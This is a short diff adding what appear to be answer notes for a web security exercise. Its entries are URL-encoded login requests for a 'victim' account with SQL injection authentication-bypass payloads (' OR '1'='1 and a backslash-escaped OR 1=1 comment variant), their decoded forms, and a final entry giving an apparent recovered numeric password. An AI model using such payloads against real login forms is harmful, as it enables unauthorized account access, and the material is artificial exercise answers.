@@ -1,0 +1,13 @@
+1.0
+username=victim&password=hi%27%20OR%20%271%27%3D%271
+
+hi' OR '1'='1
+
+
+1.1
+username=victim&password=i%5C%27%20OR%201%3D1%20--%20
+
+"i\' OR 1=1 -- " (" used to indicate the space at the end of --)
+
+1.2
+username=victim&password=6365540
